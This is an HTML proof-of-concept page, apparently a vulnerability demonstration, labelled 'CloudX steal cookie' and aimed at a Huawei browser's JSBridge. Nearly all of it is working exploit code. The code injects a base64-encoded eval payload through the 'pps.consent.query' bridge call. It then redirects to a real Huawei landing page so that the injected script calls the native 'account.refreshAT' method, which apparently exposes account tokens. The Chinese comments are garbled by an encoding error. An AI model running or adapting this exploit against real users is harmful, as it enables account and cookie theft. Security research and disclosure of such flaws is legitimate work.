<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HW JSBridge POC</title>
    <style>
        #triggerBtn {
            width: 80%;
            height: 200px;
            font-size: 30px;
            cursor: pointer;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 10px;
            margin: 20px auto;
            display: block;
        }
        #triggerBtn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        h1 {
            color: #d93025;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>AAAAAAAAAAAAAAAAAAAAA</h1>
    <button id="triggerBtn">CloudX steal cookie</button>

    <script type="text/javascript">
        (() => {
            "use strict";
            // å­˜å‚¨å®šæ—¶å™¨IDï¼ˆä»…ç”¨äºé‡è¯•æ£€æµ‹ï¼Œæ•°é‡å¤§å¹…å‡å°‘ï¼‰
            let timerId = null;
            // æ‰§è¡ŒæˆåŠŸæ ‡è®°ï¼šé¿å…é‡å¤è°ƒç”¨JSBridge
            let isExecuted = false;
            // æ³¨å…¥ä»£ç ï¼ˆä¿ç•™åŸé€»è¾‘ï¼Œå¢å¼ºå¼¹æ¡†å’Œå¼‚å¸¸å¤„ç†ï¼‰
            const injectCode = `
                setTimeout(() => {
                    alert('[æ³¨å…¥é€»è¾‘è§¦å‘] å¼€å§‹æ‰§è¡ŒåŸç”Ÿæ–¹æ³•è°ƒç”¨é€»è¾‘...');
                    window.hwbr = window.hwbr || {};
                    window.hwbr.callbackFromNative = function (a, b, c, d, e) {
                        if (a === 'callbackId') {
                            // åŸç”Ÿå›è°ƒå¼¹æ¡†ï¼šç©ºå€¼å‹å¥½å±•ç¤º
                            alert('[âœ… åŸç”Ÿå›è°ƒæˆåŠŸ]\\nå‚æ•°bï¼š' + (b ?? 'æ— ') + '\\nå‚æ•°cï¼š' + (c ?? 'æ— ') + '\\nå‚æ•°dï¼š' + (d ? d.toString() : 'æ— '));
                        }
                    };
                    // æ£€æµ‹_hwbrNativeå†è°ƒç”¨ï¼Œé¿å…æŠ¥é”™
                    if (window._hwbrNative && typeof window._hwbrNative.invoke === 'function') {
                        alert('[å‡†å¤‡è°ƒç”¨] åŸç”Ÿaccount.refreshATæ–¹æ³•');
                        window._hwbrNative.invoke('account', 'refreshAT', 'callbackId', '["123", "123"]', 10);
                    } else {
                        alert('[âŒ é”™è¯¯] æœªæ£€æµ‹åˆ°_hwbrNative.invokeæ–¹æ³•ï¼Œæ— æ³•è°ƒç”¨åŸç”Ÿæ¥å£');
                        console.error('_hwbrNative is not defined or invoke is not a function');
                    }
                }, 500);
            `;
            // ç›®æ ‡è·³è½¬URL
            const targetUrl = 'https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/';

            // Base64å…¼å®¹ç¼–è§£ç ï¼ˆå¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼‰
            function base64Encode(str) {
                return btoa(unescape(encodeURIComponent(str)));
            }

            // æ¸…ç†å®šæ—¶å™¨ï¼šå•ä¸ªå®šæ—¶å™¨ï¼Œç®€æ´é«˜æ•ˆ
            function clearTimer() {
                if (timerId) {
                    clearTimeout(timerId);
                    timerId = null;
                    console.log('å·²æ¸…ç†æœªæ‰§è¡Œçš„æ£€æµ‹å®šæ—¶å™¨');
                }
            }

            // æ ¸å¿ƒï¼šJSBridgeæ£€æµ‹+è°ƒç”¨ï¼ˆæ”¹ä¸ºé‡è¯•æ¨¡å¼ï¼Œæ›¿ä»£4000æ¬¡å¾ªç¯ï¼‰
            function checkAndCallJSBridge(injectBase64, currUrl) {
                // å·²æ‰§è¡Œ/å·²æ¸…ç†ï¼Œç›´æ¥è¿”å›
                if (isExecuted || !timerId) return;
                
                try {
                    // å¥å£®æ£€æµ‹_HwJSBridge
                    if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
                        isExecuted = true; // æ ‡è®°æ‰§è¡ŒæˆåŠŸ
                        clearTimer(); // ç«‹å³æ¸…ç†å®šæ—¶å™¨ï¼Œé¿å…é‡å¤æ‰§è¡Œ
                        
                        // æ„é€ æ³¨å…¥è½½è·ï¼ˆä¿®å¤åŸcontentæœªå®šä¹‰é—®é¢˜ï¼‰
                        const injectPayload = '\'},\'*\');}}};' + `eval(atob("${injectBase64}"));//`;
                        const data = {
                            'content': JSON.stringify({}),
                            'url': 'https://www.baidu.com',
                            'webid': 'deadbeef',
                            'top': false,
                            'uuid': injectPayload
                        };

                        // å…³é”®å¼¹æ¡†ï¼šç¡®è®¤æ£€æµ‹åˆ°JSBridgeï¼Œå³å°†å‘é€è½½è·
                        alert('[âœ… JSBridgeæ£€æµ‹æˆåŠŸ] å·²æ‰¾åˆ°_HwJSBridge.invokeAsyncï¼Œå‡†å¤‡å‘é€æ³¨å…¥è½½è·ï¼');
                        // è°ƒç”¨åŸç”ŸJSBridgeæ–¹æ³•
                        window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
                        alert('[âœ… è½½è·å‘é€æˆåŠŸ] å·²é€šè¿‡pps.consent.queryå°†æ³¨å…¥ä»£ç å‘é€è‡³åŸç”Ÿï¼');
                        
                        // è·³è½¬åˆ°ç›®æ ‡é¡µï¼ˆè§¦å‘æ³¨å…¥é€»è¾‘çš„urlåˆ¤æ–­æ¡ä»¶ï¼‰
                        alert('[å‡†å¤‡è·³è½¬] å³å°†è·³è½¬åˆ°ç›®æ ‡é¡µï¼Œè§¦å‘æ³¨å…¥ä»£ç æ‰§è¡Œ...');
                        window.location.href = targetUrl;
                    } else {
                        // æœªæ£€æµ‹åˆ°ï¼Œæç¤ºå¹¶ç»§ç»­é‡è¯•
                        console.log('æœªæ£€æµ‹åˆ°_HwJSBridgeï¼Œç»§ç»­é‡è¯•...');
                        // é‡è¯•ï¼š100msåå†æ¬¡æ£€æµ‹ï¼Œæœ€å¤šé‡è¯•20æ¬¡ï¼ˆå¯è‡ªè¡Œè°ƒæ•´ï¼‰
                        const retryCount = +timerId.toString().split('_')[1] || 1;
                        if (retryCount >= 20) {
                            clearTimer();
                            alert('[âŒ æ£€æµ‹å¤±è´¥] é‡è¯•20æ¬¡åä»æœªæ‰¾åˆ°_HwJSBridgeï¼Œå¯èƒ½éåä¸ºæµè§ˆå™¨ç¯å¢ƒ');
                            // æ¢å¤æŒ‰é’®çŠ¶æ€
                            document.getElementById('triggerBtn').disabled = false;
                            document.getElementById('triggerBtn').innerText = 'CloudX steal cookie';
                            return;
                        }
                        // é‡æ–°åˆ›å»ºå®šæ—¶å™¨ï¼Œæºå¸¦é‡è¯•æ¬¡æ•°
                        timerId = setTimeout(() => checkAndCallJSBridge(injectBase64, currUrl), 100);
                        Object.defineProperty(timerId, 'retryCount', { value: retryCount + 1 });
                    }
                } catch (err) {
                    clearTimer();
                    alert(`[âŒ æ£€æµ‹æ‰§è¡Œé”™è¯¯] ${err.message}`);
                    console.error('JSBridgeæ£€æµ‹é”™è¯¯ï¼š', err);
                    // æ¢å¤æŒ‰é’®
                    document.getElementById('triggerBtn').disabled = false;
                    document.getElementById('triggerBtn').innerText = 'CloudX steal cookie';
                }
            }

            // æ ¸å¿ƒPOCè§¦å‘å‡½æ•°
            function triggerPoc(url, code) {
                const btn = document.getElementById('triggerBtn');
                btn.disabled = true;
                btn.innerText = 'æ‰§è¡Œä¸­...è¯·å‹¿é‡å¤ç‚¹å‡»';
                // é‡ç½®çŠ¶æ€ï¼šé¿å…å¤šæ¬¡ç‚¹å‡»çš„çŠ¶æ€æ±¡æŸ“
                isExecuted = false;
                clearTimer();

                try {
                    const currUrl = window.location.href;
                    // æ„é€ æ³¨å…¥è½½è·ï¼Œè½¬ä¹‰urlé¿å…è¯­æ³•é”™è¯¯
                    const safeCurrUrl = encodeURIComponent(currUrl);
                    const payload = `
                        if (!location.href.startsWith("${safeCurrUrl}") && !window.__cloudx_called) {
                            window.__cloudx_called = true;
                            ${code || ''}
                        }
                    `;
                    // Base64ç¼–ç è½½è·
                    const injectBase64 = base64Encode(payload);
                    
                    alert('[ğŸ“Œ æ‰§è¡Œå¼€å§‹] å·²æ„é€ æ³¨å…¥è½½è·ï¼Œå¯åŠ¨JSBridgeé‡è¯•æ£€æµ‹ï¼ˆå…±20æ¬¡ï¼Œæ¯æ¬¡100msï¼‰');
                    // é¦–æ¬¡å¯åŠ¨æ£€æµ‹ï¼šç«‹å³æ‰§è¡Œä¸€æ¬¡ï¼Œåç»­è‡ªåŠ¨é‡è¯•
                    timerId = setTimeout(() => checkAndCallJSBridge(injectBase64, currUrl), 0);
                    Object.defineProperty(timerId, 'retryCount', { value: 1 });

                } catch (globalErr) {
                    alert(`[âŒ å…¨å±€é”™è¯¯] æ ¸å¿ƒé€»è¾‘æ‰§è¡Œå¤±è´¥ï¼š${globalErr.message}`);
                    console.error('å…¨å±€é”™è¯¯ï¼š', globalErr);
                    // å¼‚å¸¸æ¢å¤æŒ‰é’®
                    btn.disabled = false;
                    btn.innerText = 'CloudX steal cookie';
                }
            }

            // é¡µé¢å¸è½½å‰å…œåº•æ¸…ç†å®šæ—¶å™¨ï¼ˆé˜²æ­¢å†…å­˜æ³„æ¼ï¼‰
            window.addEventListener('beforeunload', clearTimer);
            // ç»‘å®šæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼ˆè§£è€¦ï¼‰
            document.getElementById('triggerBtn').addEventListener('click', function () {
                triggerPoc(targetUrl, injectCode);
            });

        })();
    </script>
</body>
</html>
